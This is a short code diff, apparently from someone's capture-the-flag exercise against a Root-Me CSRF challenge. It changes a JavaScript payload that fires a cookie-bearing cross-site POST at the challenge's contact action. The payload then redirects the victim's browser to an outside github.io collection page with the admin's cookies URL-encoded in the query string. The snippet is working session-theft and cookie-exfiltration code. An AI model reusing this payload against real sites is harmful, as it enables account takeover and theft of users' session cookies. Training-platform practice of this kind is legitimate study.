@@ -14,7 +14,7 @@
             var adminPage = window.location.href;
             
             // 2. Faire l'action CSRF vers l'application cible
-            fetch('https://challenge01.root-me.org/csrf/action', {
+            fetch('http://challenge01.root-me.org/web-client/ch22/index.php?action=contact', {
                 method: 'POST',
                 credentials: 'include', // Important: envoie les cookies de session
                 headers: {
@@ -24,7 +24,7 @@
             })
             .then(() => {
                 // 3. Rediriger vers une page de collecte
-                window.location.href = 'https://votre-username.github.io/collect?cookies=' 
+                window.location.href = 'https://ridou77.github.io/TP-cyber/collect.html?cookies=' 
                     + encodeURIComponent(adminCookies) + '&success=true';
             });
         }
